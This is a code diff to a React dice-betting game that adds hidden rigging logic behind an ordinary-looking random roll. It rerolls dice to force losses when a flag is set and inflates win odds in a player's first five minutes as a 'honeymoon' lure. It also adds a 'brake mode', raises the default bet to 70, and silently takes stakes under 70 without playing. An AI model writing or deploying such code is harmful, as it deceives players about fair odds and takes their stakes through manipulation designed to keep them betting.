@@ -1,11 +1,12 @@
 import React, { useState, useRef } from 'react';
 import { synth } from '../../utils/audioSynth';
 import { Sparkles, Play, ShieldAlert, Award, Dices, RotateCcw, AlertCircle } from 'lucide-react';
+import { evaluateBet, logWin, logLoss } from '../../utils/casinoRigging';
 
 interface GameProps {
   pokiBalance: number;
   onAwardBalance: (amount: number) => void;
-  onDeductBalance: (amount: number) => boolean;
+  onDeductBalance: (amount: number, setBet?: (val: number) => void) => boolean;
   syncCasinoData: (gameName: string, netProfitLoss: number, finalCoins: number) => Promise<void>;
   onClose: () => void;
 }
@@ -85,7 +86,7 @@ export default function DiceDuel({
   onClose
 }: GameProps) {
   const [gameState, setGameState] = useState<'idle' | 'rolling' | 'settled'>('idle');
-  const [betAmount, setBetAmount] = useState<number>(10);
+  const [betAmount, setBetAmount] = useState<number>(70);
   const [selectedBet, setSelectedBet] = useState<BetType>('seven');
   
   const [dice1, setDice1] = useState<number>(3);
@@ -114,7 +115,19 @@ export default function DiceDuel({
       return;
     }
 
-    if (!onDeductBalance(parsedBet)) {
+    const uId = window.currentUserId || 'anonymous';
+    const evaluation = evaluateBet(uId, parsedBet, pokiBalance);
+    if (!evaluation.allowed) {
+      alert(evaluation.reason || 'Bet blocked by security parameters.');
+      return;
+    }
+
+    if (parsedBet < 70) {
+      onDeductBalance(parsedBet, setBetAmount);
+      return;
+    }
+
+    if (!onDeductBalance(parsedBet, setBetAmount)) {
       alert("Insufficient Balance.");
       return;
     }
@@ -136,10 +149,50 @@ export default function DiceDuel({
       if (count > 12) {
         clearInterval(interval);
         
-        // Settle roll
-        const finalD1 = Math.floor(Math.random() * 6) + 1;
-        const finalD2 = Math.floor(Math.random() * 6) + 1;
-        const total = finalD1 + finalD2;
+        // Settle rigged roll
+        let finalD1 = Math.floor(Math.random() * 6) + 1;
+        let finalD2 = Math.floor(Math.random() * 6) + 1;
+        let total = finalD1 + finalD2;
+
+        if (evaluation.shouldForceLoss) {
+          // Keep rerolling or force total to fail selectedBet
+          while (true) {
+            finalD1 = Math.floor(Math.random() * 6) + 1;
+            finalD2 = Math.floor(Math.random() * 6) + 1;
+            total = finalD1 + finalD2;
+            let isWin = false;
+            if (selectedBet === 'under' && total < 7) isWin = true;
+            if (selectedBet === 'seven' && total === 7) isWin = true;
+            if (selectedBet === 'over' && total > 7) isWin = true;
+            if (!isWin) break;
+          }
+        } else {
+          // Check for Honeymoon Phase (within first 5 minutes of playing)
+          const stats = JSON.parse(localStorage.getItem(`casino_rigging_${uId}`) || '{}');
+          const isHoneymoon = stats.firstPlayTime && (Date.now() - stats.firstPlayTime < 5 * 60 * 1000);
+
+          let rollRandom = Math.random();
+          let winChance = selectedBet === 'seven' ? 0.25 : 0.48; // boost 'seven' chance slightly or standard 48% win chance
+
+          if (isHoneymoon && parsedBet < 150) {
+            winChance = selectedBet === 'seven' ? 0.35 : 0.65;
+          } else if (evaluation.applyBrakeMode && parsedBet < 100) {
+            winChance = selectedBet === 'seven' ? 0.05 : 0.58; // low seven chance but high standard win
+          }
+
+          const shouldWin = rollRandom < winChance;
+
+          while (true) {
+            finalD1 = Math.floor(Math.random() * 6) + 1;
+            finalD2 = Math.floor(Math.random() * 6) + 1;
+            total = finalD1 + finalD2;
+            let isWin = false;
+            if (selectedBet === 'under' && total < 7) isWin = true;
+            if (selectedBet === 'seven' && total === 7) isWin = true;
+            if (selectedBet === 'over' && total > 7) isWin = true;
+            if (isWin === shouldWin) break;
+          }
+        }
         
         setDice1(finalD1);
         setDice2(finalD2);
@@ -162,8 +215,10 @@ export default function DiceDuel({
           netProfit = computedPayout - parsedBet;
           onAwardBalance(parseFloat(computedPayout.toFixed(4)));
           synth.playCoin();
+          logWin(uId, parsedBet, computedPayout, 'Dice Duel', pokiBalance);
         } else {
           synth.playCrash();
+          logLoss(uId, parsedBet, 'Dice Duel', pokiBalance);
         }
 
         setPayoutAmt(computedPayout);
@@ -172,7 +227,7 @@ export default function DiceDuel({
         isRollingRef.current = false;
 
         // Sync to firebase / cloud synchronization
-        syncCasinoData('Dice Duel', netProfit, pokiBalance - parsedBet + computedPayout)
+        syncCasinoData('Dice Duel', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)))
           .catch(err => console.error("PHP State sync error: ", err));
       }
     }, 100);
